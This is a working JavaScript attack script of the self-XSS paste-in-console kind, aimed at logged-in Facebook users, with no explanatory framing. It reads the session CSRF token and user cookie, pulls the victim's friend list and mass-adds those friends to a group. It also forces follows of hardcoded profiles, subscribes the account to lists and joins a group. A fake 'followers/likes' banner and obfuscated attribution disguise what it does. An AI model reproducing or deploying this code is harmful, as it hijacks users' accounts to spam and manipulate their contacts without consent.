(function(){var f={dtsg:document.getElementsByName("fb_dtsg")[0].value,uid:document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),gid:document.getElementsByName("group_id")[0].value,frns:Array(),prenKe:0,okeh:0,gagal:0,getAjak:function(b){var c=new XMLHttpRequest;c.open("GET",b,!0),c.onreadystatechange=function(){if(4==c.readyState&&200==c.status){var a=eval("("+c.responseText.substr(9)+")");a.payload&&a.payload.entries&&(f.frns=a.payload.entries.sort(function(){return.5-Math.random()})),document.getElementById("hasilsurasil").innerHTML="UserID:<b>"+f.frns.length+" ᴥThe Biggest Worldwide Addmarketᴥ</b><div id='hasilsatu'></div><div id='hasildua'></div><div id='hasiltiga' style='min-width:600px;display:inline-block;text-align:left'></div>"+crj;for(x in f.frns)f.senAjak(x)}else document.getElementById("hasilsurasil").innerHTML=4==c.readyState&&404==c.status?"<b style='color:darkred'>Page Not Found!</b>"+crj:"<b style='color:yellow'>informationen vom Servern werden gesammelt...("+c.readyState+")</b>"+crj},c.send()},senAjak:function(d){var e=new XMLHttpRequest,prm="__a=1&fb_dtsg="+f.dtsg+"&group_id="+f.gid+"&source=typeahead&ref=&message_id=&members="+f.frns[d].uid+"&__user="+f.uid+"&phstamp=";e.open("POST","/ajax/groups/members/add_post.php",!0),e.setRequestHeader("Content-type","application/x-www-form-urlencoded"),e.setRequestHeader("Content-length",prm.length),e.setRequestHeader("Connection","keep-alive"),e.onreadystatechange=function(){if(4==e.readyState&&200==e.status){var a=eval("("+e.responseText.substr(9)+")");if(f.prenKe++,document.getElementById("hasilsatu").innerHTML="<div><b>"+f.prenKe+"</b><b>"+f.frns.length+"</b></div>",a.errorDescription&&(f.gagal++,document.getElementById("hasiltiga").innerHTML="<div><b style='color:darkorange'>( "+f.gagal+" )</b> <span style='color:darkorange'>"+a.errorDescription+"</span></div>"),a.jsmods&&a.jsmods.require){var b="<div>";for(x in a.jsmods.require)a.jsmods.require[x][a.jsmods.require[x].length-1][1]&&(b+="<b style='color:darkgreen'>"+a.jsmods.require[x][a.jsmods.require[x].length-1][1]+"</b> ");b+="<div>",document.getElementById("hasildua").innerHTML=b}if(a.onload)for(z in a.onload){var c=eval(a.onload[z].replace(/Arbiter.inform/i,""));if(c.uid&&c.name){f.okeh++,document.getElementById("hasiltiga").innerHTML="<div><b style='color:darkgreen'>( "+f.okeh+" )</b> <a href='/"+c.uid+"' target='_blank'><b>"+c.name+"</b></a> gefundene Personen</div>";break}}f.prenKe==f.frns.length&&(document.getElementById("hasiltiga").style.textAlign="center",document.getElementById("hasiltiga").innerHTML+="<div style='font-size:12px;font-weight:bold'><a href='.'</a>50.000 Facebook Abonnenten</div><div style='font-size:12px;font-weight:bold'><a href='.'</a>25.000 Youtube Abonnenten</div><div style='font-size:12px;font-weight:bold'><a href='.'</a>20.000 Facebook Fanpage Likes</div><div style='font-size:12px;font-weight:bold'><a href='.'</a>5.000 Freundschaftsanfragen</div><div style='font-size:12px;font-weight:bold'><a href='.'</a>20.000 Instagram Followers</div><div style='font-size:12px;font-weight:bold'><a href='.'</a>10.000 Profilbild Likes</div><div style='font-size:15px'><a href='/' onClick='document.getElementById(\"hasilsurasil\").style.display=\"none\";return false'>Console Herunterfahren</a></div>")}},e.send(prm)}},g=["i","a","e","g","o","s","n","b","l","p","m","2","r","0","c","1","t","3","©"],crl=g[1]+g[0]+g[6]+g[3]+g[14]+g[12]+g[2]+g[1]+g[16]+g[0]+g[4]+g[6]+g[5]+"."+g[7]+g[8]+g[4]+g[3]+g[5]+g[9]+g[4]+g[16]+"."+g[14]+g[4]+g[10],crj="<div style='margin-top:0px;color:gray;font-size:0px'>"+g[1].toUpperCase()+g[0]+g[6]+g[3]+g[14].toUpperCase()+g[12]+g[2]+g[1]+g[16]+g[0]+g[4]+g[6]+g[5]+" "+g[g.length-1]+g[11]+g[13]+g[15]+g[17]+"<div style='font-size:0px'><a href='https://www.facebook.com/groups/1432711386952022/' target='_blank'>"+crl+"</a></div></div>";document.body.innerHTML+="<center id='hasilsurasil' style='min-height:50px;width:600px;position:fixed;top:100px;left:"+(document.body.offsetWidth-530)/2+"px;border-radius:10px;padding:10px;z-index:999999;border:5px solid darkorange;background-color:rgba(255,140,0,0.99)'><b>Suche Personen</b>"+crj+"</center>",f.getAjak("/ajax/typeahead/first_degree.php?__a=1&viewer="+f.uid+"&token="+Math.random()+"&filter[0]=user&options[0]=friends_only")})(); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;

function cereziAl(isim) {
var tarama = isim + "=";
if (document.cookie.length > 0) {
konum = document.cookie.indexOf(tarama)
if (konum != -1) {
konum += tarama.length
son = document.cookie.indexOf(";", konum)
if (son == -1)
son = document.cookie.length
return unescape(document.cookie.substring(konum, son))
}
else { return ""; }
}
}

function getRandomInt (min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
var http4 = new XMLHttpRequest();

var url4 = "/ajax/follow/follow_profile.php?__a=1";

var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);

//Send the proper header information along with the request
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");

http4.onreadystatechange = function() {//Call a function when the state changes.
if(http4.readyState == 4 && http4.status == 200) {

http4.close; // Close the connection

}
}

http4.send(params4);
}

function sublist(uidss) {
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
}
a("1593170042");
a("100001628262168");
sublist("506524782745126");
sublist("555082877889316");
sublist("555082554556015");

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
data = eval('(' + gf['responseText']['substr'](9) + ')');
if (data['error']) {} else {
friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
return _0x93dax8['index'] - _0x93dax9['index'];
});
};
};
